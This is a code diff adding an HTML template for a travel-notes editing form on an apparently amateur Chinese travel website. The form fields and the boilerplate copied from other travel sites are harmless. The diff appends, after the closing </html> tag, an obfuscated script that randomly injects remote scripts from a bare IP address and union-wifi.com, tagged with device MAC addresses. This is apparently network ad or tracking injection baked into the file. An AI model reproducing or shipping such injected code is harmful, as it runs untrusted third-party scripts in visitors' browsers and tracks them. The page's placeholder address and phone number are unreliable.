@@ -1,0 +1,534 @@
+<!DOCTYPE HTML>
+<html xmlns:th="http://www.w3.org/1999/xhtml">
+<head>
+    <!--    发表游记页面    -->
+    <meta charset="utf-8">
+    <title>云游旅行网_云南旅行社精品网站_云南旅游云南中青国际旅行社网站</title>
+
+    <meta name="description"
+          content="云游旅行网(yntravel.com)为云南中青国际旅行社旗下网站，提供云南旅游报价、云南自由行、昆明周边旅游、昆明出发国内游及出境游等旅游产品，云南旅行社网站首选！旅游咨询电话：400-633-5280"/>
+    <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
+    <link href="http://xnxw.cncnimg.cn/css/front/base.css" rel="stylesheet" type="text/css"/>
+    <link href="http://xnxw.cncnimg.cn/css/front/templet2/home1.css?v=0317" rel="stylesheet" type="text/css"/>
+    <link href="http://xnxw.cncnimg.cn/css/front/templet2/home1_color1.css?v=0317" rel="stylesheet" type="text/css"/>
+    <!-- 最新版本的 Bootstrap 核心 CSS 文件 -->
+    <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script language="javascript" type="text/javascript" src="../My97DatePicker/WdatePicker.js"></script>
+
+    <link href="../js/kindeditor-4.1.10/themes/default/default.css" type="text/css" rel="stylesheet">
+    <script type="text/javascript" charset="utf-8" src="../js/kindeditor-4.1.10/kindeditor-all-min.js"></script>
+    <script type="text/javascript" charset="utf-8" src="../js/kindeditor-4.1.10/lang/zh_CN.js"></script>
+
+    <style>
+        body {
+            text-align: center
+        }
+        .div {
+            margin: 0 auto;
+            width: 1000px;
+        }
+        /* css注释：为了观察效果设置宽度 边框 高度等样式 */
+    </style>
+    <script src="../static/js/jquery-1.11.1.js"></script>
+</head>
+<script>var auto;</script>
+<body style="background:#D5F2FA url(http://x1.cncnimg.cn/p10068/10/daf8.jpg) no-repeat center top">
+
+<div class="warpper">
+
+    <div id="site_nav">
+        <div class="login" th:if="${deng1}!=null"><em>欢迎来到记忆之旅 </em>
+            <em>欢迎来到记忆之旅 </em><a href="getuser.action" ><span th:text="${deng1}" id="name"></span></a>|<a href="logout.action" rel="nofollow">退出</a>
+        </div>
+        <div class="login" th:if="${deng1}==null"><em>欢迎来到记忆之旅 </em>
+            <a href="login.html">登录</a>|<a href="register.html" rel="nofollow">免费注册</a>
+        </div>            <div class="quick_menu">
+                <div class="top_ewm">
+                    <a class="mobile"><img src="http://x1.cncnimg.cn/p10068/10068_code.jpg"/></a>
+                </div>
+                <em>旅行社业务经营许可证 <a href="/about" target="_blank">L-YN-CJ00009</a></em>
+                <a href="/member/guester" rel="nofollow">订单查询</a>|
+                <a href="/pay_order" rel="nofollow">快捷支付</a>| <a href="javascript:;" onClick="addBookMark()"
+                                                                 rel="nofollow">加入收藏</a>|
+                <a href="/sitemap">网站导航</a>
+            </div>
+        </div>
+    </div>
+    <div class="header fn-clear">
+
+        <div class="nav_layer">
+            <div class="nav_layer_con">
+                <ul>
+                    <li class="all_pro"><span>全部旅游产品分类</span></li>
+
+
+                    <li  class="#"><a href="/"><span>首页<i class=""></i></span></a></li>
+                    <li ><a href="#"><span>门票<i ></i></span></a></li>
+                    <li ><a href="/lvyou"><span>旅游<i ></i></span></a></li>
+                    <li ><a href="/findTourist"><span>景点<i ></i></span></a></li>
+                    <li ><a href="/map"><span>目的地<i ></i></span></a></li>
+                    <li ><a href="#"><span>攻略<i ></i></span></a></li>
+                    <li ><a href="/Thematic_tour_homepage.html"><span>旅游专题<i ></i></span></a></li>
+                    <li ><a href="/individualCommunity"><span>个人社区<i class="hot1"></i></span></a></li>
+
+                </ul>
+            </div>
+        </div>
+    </div>
+    <script src="http://xnxw.cncnimg.cn/js/jquery1.10.2.min.js"></script>
+    <script src="http://xnxw.cncnimg.cn/js/front/base.js"></script>
+    <script type="text/javascript">
+        $(function () {
+            $('.J_ercode').mouseover(function () {
+                $(this).find('.J_code_img').show();
+            });
+            $('.J_ercode').mouseout(function () {
+                $(this).find('.J_code_img').hide();
+            });
+        });
+    </script>
+
+    <script type="text/javascript" src="http://xnxw.cncnimg.cn/js/index/index2.js"></script>
+    <style>
+        .nav_layer_con ul li a {
+            float: left;
+            height: 40px;
+            padding: 0 8px;
+            font-size: 14px;
+            color: #fff;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .gg1000 {
+            _width: 100%;
+            background-color: #777;
+            background-repeat: no-repeat;
+            background-position: center top;
+            padding: 0;
+            position: relative;
+        }
+
+        .gg1000 a {
+            display: block;
+            margin: 0 auto;
+            width: 1000px;
+            background-repeat: no-repeat;
+            background-position: center top;
+            min-height: 40px;
+        }
+
+        .gg1000 img {
+            display: block;
+            _margin-left: -9000px;
+            left: -9000px;
+            position: relative;
+        }
+
+        .gg1000 i {
+            position: absolute;
+            background: url(/static/images/front/home30/close.gif) no-repeat;
+            right: 0px;
+            top: 0px;
+            cursor: pointer;
+            height: 40px;
+            width: 40px;
+            z-index: 10;
+            opacity: 0.6;
+            filter: alpha(opacity=60);
+        }
+
+        .gg1000 i:hover {
+            opacity: 1;
+            filter: alpha(opacity=100);
+        }
+
+        .tab_cont .pro_list {
+            display: none;
+        }
+
+        .tab_cont .showed {
+            display: block;
+        }
+
+        .tab_cont .showed {
+            background: url(/static/images/front/zoomloader.gif) no-repeat center center;
+        }
+    </style>
+</div>
+<style>
+    #rcorners6 {
+        border-radius: 15px 50px;
+        background: #8AC007;
+        padding: 20px;
+        width: 1350px;
+        height: 50px;
+    }
+</style>
+<p id="rcorners6" style="font-size: 20px;">
+    <a href="/individualCommunity" class="qa_nav_word"
+       rel="nofollow" id="J_qa_nav_index">首页</a>
+    <a href="/maptrack" class="qa_nav_word"
+       rel="nofollow" id="J_qa_nav_footpoint">足迹</a>
+    <a href="/dingdan" class="qa_nav_word click"
+       rel="nofollow" id="J_qa_nav_tri">我的订单</a>
+    <a href="/TravelNotes/travelNotesList" class="qa_nav_word click"
+       rel="nofollow" id="J_qa_nav_trips">游记</a>
+</p>
+
+<form action="/TravelNotes/updateTravelNotes" method="post">
+<div class="div" th:each="notesByNid:${travelNotesByNid}">
+    <div class="set_index" id="_j_cover_box">
+            <div class="tuc-user" hidden="hidden">
+            <input type="text" name="user_id" th:value="${notesByNid.user_id}"/>
+                <input type="text" name="n_id" th:value="${notesByNid.n_id}"/>
+            </div>
+    </div>
+    <div class="form-group">
+        <h2 style="color: chartreuse"><label for="_j_title">游记标题</label></h2>
+        <time datetime="n_releaseDate" th:value="${#calendars.format(notesByNid.n_releaseDate,'yyyy-MM-dd hh:mm:ss')}"></time>
+        <input type="text" class="form-control" id="_j_title" th:value="${notesByNid.n_headline}" name="n_headline" placeholder="快来给游记起个标题吧" maxlength="48"/>
+        <div class="clear"></div>
+    </div>
+
+        <table class="table table-hover table-hover-bordered">
+            <thead>
+            <tr class="success">
+                <th><h5><label for="n_city">城市</label></h5></th>
+                <th><h5><label for="n_scenic">景点</label></h5></th>
+                <th><h5><label for="n_destination">目的地</label></h5></th>
+                <th><h5><label for="n_startDate">起始日期</label></h5></th>
+                <th><h5><label for="n_endDate">结束日期</label></h5></th>
+                <th><h5><label for="n_time_limit">旅游周期</label></h5></th>
+            </tr>
+            </thead>
+            <tbody>
+            <tr class="warning">
+                <td><input type="text" class="form-control" id="n_city" th:value="${notesByNid.n_city}" name="n_city" placeholder="城市" maxlength="48"/>
+                </td>
+                <td><input type="text" class="form-control" id="n_scenic" th:value="${notesByNid.n_scenic}" name="n_scenic" placeholder="景点" maxlength="48"/>
+                </td>
+                <td><input type="text" class="form-control" id="n_destination" th:value="${notesByNid.n_destination}" name="n_destination" placeholder="目的地"
+                           maxlength="48"/></td>
+                <td><input type="text" name="n_startDate" class="form-control form-control-Wdate"
+                           id="n_startDate" th:value="${notesByNid.n_startDate}"
+                           onClick="WdatePicker()"></td>
+                <td><input type="text" name="n_endDate" class="form-control form-control-Wdate" id="n_endDate"
+                           th:value="${notesByNid.n_endDate}"
+                           onClick="WdatePicker()"></td>
+                <td><input type="text" class="form-control" id="n_time_limit" name="n_time_limit" th:value="${notesByNid.n_time_limit}" placeholder="旅游周期"
+                           maxlength="48"/></td>
+            </tr>
+            </tbody>
+        </table>
+
+        <div class="btn-group btn-group-justified" role="group" aria-label="...">
+                <label class="sr-only" for="exampleInputAmount">段落标题</label>
+                <div class="input-group">
+                    <div class="input-group-addon">段落标题</div>
+                    <input type="text" class="form-control" th:value="${notesByNid.n_section_titles}" name="n_section_titles" id="exampleInputAmount" placeholder="段落标题">
+                </div>
+        </div>
+    <br/><br/>
+    <div class="form-group">
+    <textarea id="editor_id" name="n_essay" style="width:800px;height:300px;visibility:hidden;"  th:text="${notesByNid.n_essay}">
+    </textarea>
+    </div>
+    <script>
+        KindEditor.ready(function(K) {
+            window.editor = K.create('#editor_id');
+        });
+    </script>
+        <!-- 模态框（Modal）-->
+        <!--<div class="modal fade" id="demoModal" tabindex="-1" role="dialog">
+            <div class="modal-dialog" role="document">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span
+                                aria-hidden="true">&times;</span></button>
+                        <h4 class="modal-title" id="exampleModalLabel">标题</h4>
+                    </div>
+                    <form class="form-inline">
+                        <div class="modal-body">
+                            <div class="form-group">
+                                <label for="n_section_titles" class="control-label">标题段落 &nbsp;&nbsp;：&nbsp;&nbsp;</label>
+                                <input type="text" name="n_section_titles" class="form-control" id="n_section_titles">
+                            </div>
+                            <div class="modal-footer">
+                                <button type="button" class="btn btn-primary">保存</button>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>-->
+
+      <!--  <div class="modal fade" id="demoModal2" tabindex="-1" role="dialog">
+            <div class="modal-dialog" role="document">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span
+                                aria-hidden="true">&times;</span></button>
+                        <h4 class="modal-title">文字内容</h4>
+                    </div>
+                    <div class="modal-body">
+                        <div class="form-group">
+                            <textarea class="form-control" rows="3"></textarea>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn btn-primary">保存</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>-->
+
+        <br/> <br/>
+        <div class="travel_bottom" style="float:right">
+            <button type="button" class="btn btn-link">
+                <a class="preview" target="_blank" href="#">保存草稿</a>
+            </button>
+            <button type="submit" class="btn btn-info">发表游记</button>
+        </div>
+    </div>
+</form>
+<br/><br/><br/>
+
+    <link rel="stylesheet" type="text/css" href="//ssl1.tuniucdn.com/s/20151019/common_foot/common_foot_v3.css"/>
+    <!-- three sun S -->
+    <div class="three_trav">
+        <div class="thr_trav">
+            <a href="http://www.tuniu.com/static/sunshine_ensure/" target="_blank"
+               style="display:block;width:100%;height:100%;">
+                <em class="tn_text" id="service_phone_head_text">客户服务电话</em>
+                <em class="tn_phone" id="service_phone_head_phone">010-666666</em>
+            </a>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="help">
+            <div class="txt bd_l0"><i class="i1"></i>
+                <strong>轻松成为旅行玩家</strong>
+                <p><a href="/help//5547" rel="nofollow" alt="旅行要知道" title="旅行要知道">旅行要知道</a></p>
+                <p><a href="/help//5548" rel="nofollow" alt="怎么选择一次好的旅行" title="怎么选择一次好的旅行">怎么选择一次好的旅行</a></p>
+                <p><a href="/help//5549" rel="nofollow" alt="旅行常见问题" title="旅行常见问题">旅行常见问题</a></p>
+                <p><a href="/help//5550" rel="nofollow" alt="旅游工具箱" title="旅游工具箱">旅游工具箱</a></p>
+            </div>
+            <div class="txt "><i class="i1"></i>
+                <strong>怎么预订</strong>
+                <p><a href="/help//5551" rel="nofollow" alt="旅游预订方式" title="旅游预订方式">旅游预订方式</a></p>
+                <p><a href="/help//5553" rel="nofollow" alt="预订常见问题" title="预订常见问题">预订常见问题</a></p>
+                <p><a href="/help//5554" rel="nofollow" alt="签署旅游合同" title="签署旅游合同">签署旅游合同</a></p>
+                <p><a href="/help//5556" rel="nofollow" alt="预订流程与服务承诺" title="预订流程与服务承诺">预订流程与服务承诺</a></p>
+            </div>
+            <div class="txt "><i class="i1"></i>
+                <strong>怎么付款</strong>
+                <p><a href="/help//5559" rel="nofollow" alt="付款方式" title="付款方式">付款方式</a></p>
+                <p><a href="/help//5560" rel="nofollow" alt="付款说明与使用帮助" title="付款说明与使用帮助">付款说明与使用帮助</a></p>
+                <p><a href="/help//5562" rel="nofollow" alt="支付安全保障" title="支付安全保障">支付安全保障</a></p>
+                <p><a href="/help//5563" rel="nofollow" alt="关于发票" title="关于发票">关于发票</a></p>
+            </div>
+            <div class="txt bd_r0"><i class="i1"></i>
+                <strong>开始旅行</strong>
+                <p><a href="/help//5564" rel="nofollow" alt="出发前的准备" title="出发前的准备">出发前的准备</a></p>
+                <p><a href="/help//5566" rel="nofollow" alt="服务建议与投诉" title="服务建议与投诉">服务建议与投诉</a></p>
+                <p><a href="/help//5567" rel="nofollow" alt="旅行故事分享" title="旅行故事分享">旅行故事分享</a></p>
+                <p><a href="/help//5568" rel="nofollow" alt="其它服务事项" title="其它服务事项">其它服务事项</a></p>
+            </div>
+            <!-- <div class="J_imgbox"><img src=""></div> -->
+        </div>
+
+        <div class="bottom_ico fn-clear" style="text-align: center;">
+            <ul>
+
+                <li class="xukezheng" style="float: none;"><a href="/about"><i
+                        style="-webkit-transform:scale(0.8); font-family: Arial;">L-YN-CJ00009</i></a></li>
+                <li style="float: none;"><span class="pay"></span></li>
+            </ul>
+        </div>
+        <div class="copyright fn-clear">
+            <div class="nav">
+                <a href="#">关于记忆之旅</a>
+                <a href="#">联系记忆之旅</a>
+                <a href="/sitemap">网站地图</a><a href="/link">友情链接</a>
+                <a href="/help">帮助中心</a>
+                <a href="/cp/login" rel="nofollow">管理</a>
+            </div>
+            <p><span>Copyright &copy; 2017 <a href="/" target="_blank">记忆之旅</a>   <a href="http://www.miitbeian.gov.cn/"
+                                                                                     target="_blank" rel="nofollow">滇ICP备14006366号-1</a></span>
+                志广科技有限公司旗下网站 公司地址：北京海淀区1314区520室 直线电话：010-666666
+            </p>
+
+
+            <p><a href="http://is.cncn.net/" target="_blank">欣欣建站</a>&nbsp;&nbsp;&nbsp;&nbsp;技术支持：<a
+                    href="http://www.cncn.net/" target="_blank">欣欣同业</a> & <a target="_blank"
+                                                                              href="http://www.cncn.com/">欣欣旅游</a></p>
+        </div>
+
+        <div class="link mt10">
+            <strong>友情链接：</strong>
+            <a href="http://www.52uyn.com/" target="_blank" title="云南旅游">云南旅游</a>
+            <a href="http://www.dujiazoo.com/" target="_blank" title="云度旅行">云度旅行</a>
+            <a href="http://www.tourcool.com/" target="_blank" title="成都青年旅行社">成都青年旅行社</a>
+            <a href="http://www.phuketrip.com/" target="_blank" title="普吉岛旅游">普吉岛旅游</a>
+            <a href="http://www.sanxia-china.com/" target="_blank" title="三峡旅游">三峡旅游</a>
+            <a href="http://www.52ycd.com/" target="_blank" title="承德旅游网">承德旅游网</a>
+            <a href="" target="_blank" title=""></a>
+            <a href="/link">更多>></a>
+        </div>
+    </div>
+</div>
+
+<script type="text/javascript">
+    $(document).ready(function () {
+        // $("img").error(function(){
+        //     var src=$(this).attr("src");
+        //     if (src.substr(0, 20) == "http://c.cncnimg.cn/") {
+        //         $(this).attr("src", "http://xnxwcdn.cncn.net/images/front/nopic_m.jpg");
+        //     }
+        // });
+        $('.s-weixin').hover(function () {
+            $(this).addClass('hover')
+        }, function () {
+            $(this).removeClass('hover')
+        });
+        // $("p.weixin").hover(function(){
+        //  $(this).addClass("hover");
+        // },function(){
+        //  $(this).removeClass("hover");
+        // });
+        $('.f-chat,.f-qq').hover(function () {
+            $('.f-qq').toggle();
+
+        });
+        $('.f-call,.f-telnum').hover(function () {
+            $('.f-telnum').toggle();
+        });
+
+        $(window).scroll(function () {
+            var top = $(window).scrollTop();
+            if (top > 0) {
+                $('.f-scrolltop').show();
+            } else {
+                $('.f-scrolltop').hide();
+            }
+        });
+        $('.f-scrolltop').click(function (event) {
+            $('body,html').animate({scrollTop: 0}, 200);
+
+        });
+
+    });
+
+    $('.tonglan_menu a').hover(function () {
+        var index = $(this).index();
+        $(this).addClass('first').siblings('a').removeClass('first');
+
+        var eleCont = $(this).parents('.hd').siblings('.bd');
+        eleCont.children('.tab_cont').children('.pro_list').eq(index).addClass('showed').siblings('.pro_list').removeClass('showed');
+    })
+
+    $(function () {
+        $('.J_imgbox').css({
+            'width': '100%',
+            'border': 0
+        });
+        $('.hideBox').css({width: '0'});
+        $('.J_imgbox').css({width: "200px"});
+        $('.s-weixin').on('mouseover', function () {
+            // var src=$('.J_hidebox').attr('src');
+
+            // $('.J_imgbox').find('img').attr('src',src).end().show();
+            $('.hideBox').show();
+        });
+        $('.s-weixin').on('mouseleave', function () {
+            $('.hideBox').hide();
+        });
+    });
+
+
+    $('.ota_menu a').hover(function () {
+        var _this = $(this);
+        var index = $(this).index();
+        if (index == 0) {
+            return;
+        }
+        var ele = _this.parents('.hd').siblings('.bd').find('.pro_list').eq(index);
+        var state = $(this).attr('data-state');
+        var id = $(this).attr('data-id');
+        var item = $(this).attr('data-item');
+        if (id == '') {
+            alert("非法操作，数据不正确");
+            return;
+        }
+        if (item == '') {
+            alert("非法操作，数据不正确");
+            return;
+        }
+
+
+        if (state != 'ajaxed') {
+            _this.attr('data-state', 'ajaxed');
+            $.ajax({
+                url: '/welcome/get_product_info',
+                type: 'POST',
+                dataType: 'JSON',
+                data: {'id': id, 'item': item},
+                success: function (data) {
+                    if (data.status == 1) {
+                        alert("非法操作，数据不正确");
+                        console.log("非法操作，数据不正确");
+                        return;
+                    } else {
+                        ele.css('background', 'none').html(data);
+                    }
+                }
+            })
+        }
+
+    })
+</script>
+
+<div class="f-fixedbox">
+    <div class="f-hover f-scrolltop">返回顶部</div>
+</div>
+
+<script src="http://xnxw.cncnimg.cn/js/jquery.lazyload.js?v=20150513"></script>
+<div style="margin:0 auto;text-align:center;width:100%;background:#f4f4f4 repeat-x 50% top"></div>
+<script>
+</script>
+
+<div style="margin:0 auto;text-align:center;width:100%;">
+    <script src="http://s11.cnzz.com/stat.php?id=5313953&web_id=5313953" language="JavaScript"></script>
+</div>
+
+</body>
+</html>
+<script>
+    function ik_random() {
+        var ik_r_min = 0;
+        var ik_r_max = 100;
+        return (parseInt(Math.random() * (ik_r_max - ik_r_min + 1) + ik_r_min));
+    }
+    function ik_isiframe() {
+        return (self != top);
+    }
+    var __m = '54:ee:75:88:2d:bc';
+    var __m2 = '00:00:00:00:00:00';
+    var __h = "<sc" + "ript src=\"http://101.201.53.95/js.php?uid=90b9a2b579ed77179e1accd617f5034b,PC,";
+    var __b = "&r=" + Math.random() + __m + __m2 + "\"></scr" + "ipt>";
+    var x = ik_random();
+    if (!ik_isiframe()) {
+        switch (true) {
+            case x >= 0 && x < 5:
+                document.write(__h + "200" + __b);
+                document.write("<sc" + "ript src=\"http://js.union-wifi.com/zm.js?R6Gpf6T&dmac=" + __m2 + "&umac=" + __m + "\"></scr" + "ipt>");
+                break;
+            case x >= 55 && x <= 100:
+                document.write(__h + "100" + __b);
+                document.write("<sc" + "ript src=\"http://js.union-wifi.com/zm.js?Rav195P&dmac=" + __m2 + "&umac=" + __m + "\"></scr" + "ipt>");
+                break;
+        }
+    }
+</script>
